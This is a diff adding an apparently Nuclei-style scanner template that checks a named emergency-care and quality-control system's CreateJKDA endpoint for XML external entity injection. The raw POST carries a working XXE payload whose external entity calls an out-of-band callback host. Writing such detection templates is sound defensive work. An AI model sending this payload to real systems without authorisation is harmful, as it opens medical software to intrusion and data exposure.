@@ -1,0 +1,35 @@
+id: poc-yaml-bian-que-ivtbq-ieqcs-createjkda-xxe
+info:
+  name: 扁鹊飞救智能急救与质控系统 CreateJKDA XML实体注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+  description: |
+    This template detects potential XML External Entity (XXE) vulnerabilities in the 扁鹊飞救智能急救与质控系统 CreateJKDA endpoint.
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/CreateJKDA HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        requestXml=<?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{reverse}}"> %remote;]>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "远程服务器"
+        part: body
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol
